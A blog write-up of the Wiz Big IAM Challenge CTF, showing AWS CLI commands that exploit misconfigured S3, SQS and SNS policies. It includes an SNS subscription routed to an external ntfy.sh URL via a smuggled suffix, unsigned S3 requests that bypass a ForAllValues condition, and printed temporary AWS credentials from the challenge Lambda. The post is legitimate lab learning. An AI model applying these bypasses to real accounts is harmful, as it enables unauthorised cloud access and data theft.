+++
title = "Wiz Big IAM Challenge"
date = 2023-06-25T16:58:18+10:00
description = "Applying myself practically"
[taxonomies]
#categories = [ "Technical", "Troubleshooting" ]
tags = [ "aws", "iam", "ctf" ]
+++

# Wiz Big IAM Challenge

## Stage 1

Policy has specific allows.
One operation on the bucket to list items and another for retrieval.
Pretty straightforward, enumerate the objects and make sure our retrieve is a valid object.
The `files/` root "directory" is the key part here.

```bash
$ aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
2023-06-05 19:13:53         37 flag1.txt
2023-06-08 19:18:24      81889 logo.pngaws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/

$ aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp
$ cat /tmp/flag1.txt
{wiz:REDACTED}
```

## Stage 2

We have both read and write to an SQS queue.
Let's see if anything on there.
First, we'll have to construct the URL from the ARN, since for whatever reason the AWS CLI hates ARNs.

```bash
$ aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "227e23b6-2766-4c32-a3fd-2c11beb9f81a",
            "ReceiptHandle": "AQEBFqM96E22m6En/GYolaLxoJV0FBAVSzPBjG5OWQHWVYBEcbpyOYu503QO8x4Vknj6tCDeesnKfEQotvIn0RDv+5AIU9HVLog8U9Ri
S5FERYnyVwUL8a22yNqboZithZMUKNDaaYyxy3hwZvgY8UfllcWvgmkEuw0asaHUrNFkNtFkSsgrWSPn7eDNqnQBktn5pjtLi3PTHIMopY4nNhG44r3Y3AoATgde+6GH27Rs8/
7ycaZcPaBGj0EnozHiyA8f1aJF0C5eSrLBe5GiCnyLc85b78k6Yl+lXmdQrQRlEU2jngb7zb4YfafzetTJqx16Il8OlFGV5ZLEumQKRC+7UUvs+H0EQaSQ3vqjQpPJfOlpal2c
LiWcnnPGa3xxtGRBRsirVoENOgNMVM6UUCvFcWVEBjVuBZbQYr9RSXm6Zo0=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://REDACTED\", \"User-Agent\": \"Lynx/
2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}
$ curl https://REDACTED
{wiz:REDACTED}
```

## Stage 3

Ok so we can subscribe to this topic, indeed, anyone on AWS can.
The restriction is that the end of the subscribing endpoint must end specifically.
This looks like it's supposed to limit subscribers to Wiz email holders.

There's no wildcard at the end.
So it does appear it'll block us from doing stuff like `tbic.wiz.io@my-domain.com`.
Let's take a look at the SNS docs.

> If the endpoint type is HTTP/S or email, or if the endpoint and the topic are not in the same AWS account,
> the endpoint owner must run the `ConfirmSubscription` action to confirm the subscription.

The policy won't allow us to confirm the subscription.
So the flag must be accessible somehow without actually getting any notifications.

What endpoints can we use?
Well, given no wildcard at the end, and that we shouldn't need to set up any infra to pass this...
We can rule out: http/s, sms, sqs, application, lambda, and firehose.
This leaves _email_ and _email-json_.
There shouldn't be much difference between these, so we'll use plain text.

Perhaps we can apply more than one email, and just delimit it by `;`?

```bash
$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@bar.com;foo@tbic.wiz.io'

An error occurred (InvalidParameter) when calling the Subscribe operation: Invalid parameter: Email address

$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@tbic.wiz.io'
{
    "SubscriptionArn": "pending confirmation"
}
```

Ok so we've got the policy allowing us to take actions, but we're stuck on an email domain we don't have access to.
Returning the subscription ARN wouldn't help, since we're theoretically not authorized to confirm the subscription.
But even then, it would fire off to an email that doesn't exist.
SQS has dead letter queues, but I think SNS has fixed retry logic and just gives up.

I thought about using `https://ntfy.sh` or something but I don't have control over the topic suffix.
So I wouldn't be able to make it match the wildcard pattern.
Also I've been told that generally you don't need to go too far to pass these.

It's still bugging me that it's just `sns:Endpoint`.
Like _perhaps_ I could get it to go to my mobile number?
But there's no way that'd match the pattern.
And it's very unlikely Wiz would want to eat the cost.

I'm pretty sure you can't sneak a mobile subscription into the same request.
It'd be one or the other cause of the `--protocol` argument.

Let's check the common parameters and see if there's anything there.
Hmmmm nope, it's basically all stuff for making the API requests work.
What about the CLI reference, any interesting arguments there?
Also nope, we touched on the subscription arn already.
The rest of this isn't looking interesting.

Except the attributes bit.
What if we could supply an on-fail or reply-to address.
Filtering isn't what we want, and some stuff only applies to http/s endpoints.
`RedrivePolicy` is the only one that looks helpful.

But this requires an SQS queue we have access to, specifically the dead letter queue.
Even the SQS queue we used prior we didn't have access to the dead letters queue.

There's no way I'm supposed to make an SQS queue that ends in that string, right?
I'm not even sure `@` is a valid character for a queue name.

Let's examine this condition.
`StringLike`, ok so the `*` is an unlimited match and it's case sensitive.

There's no way there's a default "reflective" email address we're supposed to use either, right?
Like there's no email equivalent of a broadcast address.
And even then, how would it know to send to our private email that we have access to.

The policy is quite old, as is the CLI we're given (1.27.146).
Surely we're not supposed to find security bugs that were disclosed about these.
That feels too far off base for an IAM-focussed challenge.

We can't sneak in an email using comments either.

```bash
 > aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@bar.com#@tbic.wiz.io'

An error occurred (InvalidParameter) when calling the Subscribe operation: Invalid parameter: Email address

$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint 'foo@bar.com #@tbic.wiz.io'

An error occurred (InvalidParameter) when calling the Subscribe operation: Invalid parameter: Email address
```

Ok stuff it, let's try that SQS queue.

```bash
 > aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol sqs --notification-endpoint arn

:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2?foo=bar@tbic.wiz.io

An error occurred (AuthorizationError) when calling the Subscribe operation: User: arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell is not authorized to perform: SNS:Subscribe on resource: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications because no resource-based policy allows the SNS:Subscribe action

$ aws sts get-caller-identity
{
    "UserId": "AROAZSFITKRSYE6ELQP2Q:iam_shell",
    "Account": "657483584613",
    "Arn": "arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell"
}
```

We've changed accounts it seems, though I recall the policy being that any AWS principal could perform the actions.
Did it bounce us because of the string condition?

```bash
$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2?foo=bar@tbic.wiz.io

An error occurred (AuthorizationError) when calling the Subscribe operation: Not authorized to subscribe internal endpoints

```

_Internal endpoints_ - does that mean that it's resolving the SQS domain to private addresses.
That'd make some sense, GitLab blocks private IP endpoints and mirror sources unless you allow it.

Ok, let's push on this https thing a bit and just use `ntfy.sh`.

```bash
$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://ntfy.sh/tbic-wiz-io?foo=bar@tbic.wiz.io

{
    "SubscriptionArn": "pending confirmation"
}
```

Message came through to confirm the subscription.
Clicked the subscribe link.
Another minute later and the flag arrived.

### References

- [AWS SNS API reference](https://docs.aws.amazon.com/sns/latest/api/API_Subscribe.html)
- [AWS SNS failed message docs](https://docs.aws.amazon.com/sns/latest/dg/sns-message-delivery-retries.html)
- [AWS SNS common parameters](https://docs.aws.amazon.com/sns/latest/api/CommonParameters.html)
- [AWS CLI for SNS subscribe](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sns/subscribe.html)
- [AWS IAM string conditions](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html#Conditions_String)

## Stage 4

Let's have a read of this policy.
Similar challenge to the earlier S3 one, enumerate and pull.
Ah, the `ForAllValues` is suspicious.
Let's read up on that.

Hmmm, it's very specifically advised against using this with `Allow` and single-valued checks.
I'd bet that we're checking _every_ session key for that value.
Cause I don't think we have any control over our `principalArn` and that account number is a troll.
So we should set some tag of our request/session to match that.
Perhaps we can assume our role with a session name?

```bash
 > aws sts assume-role --role-arn arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell --role-session-name arn:aws:iam::133
713371337:user/admin

An error occurred (ValidationError) when calling the AssumeRole operation: 1 validation error detected: Value 'arn:aws:iam::1337133713
37:user/admin' at 'roleSessionName' failed to satisfy constraint: Member must satisfy regular expression pattern: [\w+=,.@-]*

$ aws sts assume-role --role-arn arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell --role-session-name user/admin

An error occurred (ValidationError) when calling the AssumeRole operation: 1 validation error detected: Value 'user/admin' at 'roleSes
sionName' failed to satisfy constraint: Member must satisfy regular expression pattern: [\w+=,.@-]*

$ aws sts assume-role --role-arn arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell --role-session-name "admin"

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::657483584613:assumed-role/shell_basic_iam/i
am_shell is not authorized to perform: sts:AssumeRole on resource: arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell
```

Hmmm, so without reverting to our IAM user we can't assume the role.

```bash
$ env | grep -i aws_

AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDakbmbNYQOhE41g9u4my2WRo6tcfKP7q0aMj4TUIt/PwIhAMFGal67HXsNNqBg
bKXJGkz1mp6tPkX+UELkg9/3VuBIKuYCCCkQABoMNjU3NDgzNTg0NjEzIgzx7K3QOVU7j0wZECAqwwIoLO5OwDSUPbhddQI3GGGQ9nFSCRiXBtlxO9Dc8RanjL+jNvJFSxOrCR
lxe8aji9cCm4cHH+PeoFNIHORtbSqPpWKmiUtek+z5PnueWOJdxxHfSmv1XLDEXWlihek/QuuRW6HIyz5IRfaMMwldGTBdIgt70DRUaoEctNRFlAtvUjRyD5Oion8AMMzoQhbq
kSb798l8OSIUSeRx7hCMW61RLxMDSWulXKULQxwof+iqrsF8JTIywu96Lu425wDvEM5ifyb2USjb5gdk/nDXkBXHxleMZkJgsjWyS8+kwbMPZ6AochFBVvOebFdPrvrIEZkC98
qf6Wc/x3UVXQMu1co78TS7ST8Xt/6JZbFdbNngL65kiO1w5k2A1NJizJwV4WNjhD0Yw4mNKMgsG156+0SFfM3VrGQSMwDwtl6iCBJ7X980ADCF8t+kBjqdAUDT6Rw4exYbfvVe
U2wAXOGAMpuUqifa4hytsIgcsdAp64PytVB024K64pYBFqTidVCgeD2VHH6kqFnVBHFVSs6h0kL8TIE9/6mzRwRrIHkD00TL+HzDk2JDBlfVSapB8ifaXhw4Sur+lXZSOkyiW4
XYljFWg7eS0MBkgJa7e8le1wYtodtUJBHX2t1gJSUPgc+GP0buDw1MyWQqFQk=
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/iam_shell
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_LAMBDA_LOG_STREAM_NAME=2023/06/25/[$LATEST]c61947d8059943388213995ee7d5fbc9
AWS_EXECUTION_ENV=AWS_Lambda_python3.7
AWS_LAMBDA_FUNCTION_NAME=iam_shell
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000
AWS_DEFAULT_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=1fTrfGScJq7t0Jeul3M/xSqJpN/hX+vVjiJ+/ySD
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
AWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=ASIAZSFITKRSZV7DMCAA
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129
_AWS_XRAY_DAEMON_PORT=2000
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=4096
```

Oho, interesting. So we're in a lambda.
Curious.
Let's try and break this back down so we get whatever role the Lambda has.

```bash
$ unset AWS_SESSION_TOKEN
$ unset AWS_ACCESS_KEY_ID
$ unset AWS_SECRET_ACCESS_KEY

$ aws sts get-caller-identity
{
    "UserId": "AROAZSFITKRSYE6ELQP2Q:iam_shell",
    "Account": "657483584613",
    "Arn": "arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell"
}

$ echo $AWS_SECRET_ACCESS_KEY
REDACTED

$ export AWS_SECRET_ACCESS_KEY=''
$ echo $AWS_SECRET_ACCESS_KEY
REDACTED
```

Hmm, looks like our environment is immutable.
Rats.

Looking over the session tagging capabilities this definitely seems worth exploring.

```bash
$ aws sts assume-role --role-arn arn:aws:iam::657483584613:role/shell_basic_iam --role-session-name 'arn:aws:iam::133713371337:user/admin'

An error occurred (ValidationError) when calling the AssumeRole operation: 1 validation error detected: Value 'arn:aws:iam::1337133713
37:user/admin' at 'roleSessionName' failed to satisfy constraint: Member must satisfy regular expression pattern: [\w+=,.@-]*
```

Ok so looks like we can't use that for session name anyway.
I did recently run into something about setting tags per-request.
Maybe if we set a tag to the right key-value pair?

I _very_ much recall an argument to send tags with a request that I saw during my ABAC research.
But for the life of me I can't find it anymore.
I'm taking a look at the CLI reference, there's nothing here that would allow me to pass request tags.
Passing `--tags` and `--request-tags` to the call results in unknown argument errors.
AWS cli `help` output yields nothing either.

Let's reanalyse this.

- We need `ForAllValues:StringLike` to result in `true`.
  StringLike means it could wild-card, but there's none.
  So it's essentially `StringEquals`.
- `aws:PrincipalArn` needs to be a user from a fictitious account.
  So either we need to spoof this value, or overwhelm the logical check with some other key.
- I recall from the AWS IAM Policy Evaluation lecture that if it evaluates in too many contexts it winds up being permissive.

Just had a dumb thought.
What if the resource-based policy is permissive and accessing it from an authenticated context is the issue?
Let's try the url real quick in case it's public.

```bash
$ curl https://thebigiamchallenge-admin-storage-abf1321.s3.us-east-1.amazonaws.com/files

<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>Z5H6B2XN57C3AF82</RequestId><HostId>at+yuX/zmNDw4FyQKA+D2YN
3zCJJPG+LOZ96h4sCe993ejH6Y29ZhRGJCh+j3dAPFeRfVz5al00=</HostId></Error>

$ curl https://thebigiamchallenge-admin-storage-abf1321.s3.us-east-1.amazonaws.com

<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>6AWDHFNNB13D5R5Y</RequestId><HostId>Y/YqzjA9DsIQYdc/iSka/VR
y8RLfKzv+Xssnqh1jkGX4xgAuVcdvS9nBGTO76TxQekZj7o71KQo=</HostId></Error>
```

Rats.
Worth a shot though.

> It also returns true if there are no keys in the request,
> or if the key values resolve to a null data set, such as an empty string.

So how do we make a request with either an empty string or without the tag?

```bash
$ aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request

2023-06-07 19:15:43         42 REDACTED.txt
2023-06-08 19:20:01      81889 logo-admin.png

$ aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/REDACTED.txt -
REDACTED
```

(- ________ - #)

### References

- [Multivalue policy conditions](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html)
- [Session tags](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_session-tags.html)
- [S3API list-objects v2](https://docs.aws.amazon.com/cli/latest/reference/s3api/list-objects-v2.html)
- [S3API list-objects v1](https://docs.aws.amazon.com/cli/latest/reference/s3api/list-objects.html)
- [S3 ls](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html)

## Stage 4

The s3 permissions look like they're just there so we can retrieve the flag.
Let's focus on cognito.
I see we have a `*` grant for cognito-sync, let's focus on that.

```bash
$ aws cognito-sync list-identity-pool-usage

An error occurred (AccessDeniedException) when calling the ListIdentityPoolUsage operation: User: arn:aws:sts::657483584613:assumed-ro
le/shell_basic_iam/iam_shell is not authorized to perform: cognito-sync:ListIdentityPoolUsage on resource: arn:aws:cognito-sync:us-eas
t-1:657483584613:identitypool/null because no identity-based policy allows the cognito-sync:ListIdentityPoolUsage action

$ aws cognito-sync get-identity-pool-configuration

usage: aws [options] <command> <subcommand> [<subcommand> ...] [parameters]
To see help text, you can run:

  aws help
  aws <command> help
  aws <command> <subcommand> help
aws: error: the following arguments are required: --identity-pool-id
```

There's only a handful of cognito-sync subcommands.
After poking a couple more it seems I'll need to specify an identity pool or more for most.
The most general/basic `list-` subcommand says identitypool is null.
This makes me think we're supposed to register our own pool.

Poking further it seems like we're supposed to:

1. Locate the identity pool ID
1. Register a device to the identity pool
1. Subscribe the identity pool to the data set
1. Trigger a sync event
1. Retrieve the object path
1. Retrieve the flag from S3

I'm not fucking around with registering mobile apps or using the mobile SDK.
That last bit with setting up an endpoint for webhooks was enough.
Was fun while it lasted.

Update: I checked out the ending.
I should have thought to check the page source code but also that's not really testing IAM?
I did make a mistake connecting subcommands to API calls one-to-one.
I should have thought of checking the other cognito-related subcommands.

### References

- [AWS CLI](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cognito-sync/index.html)
- [Cognito docs](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/Welcome.html)
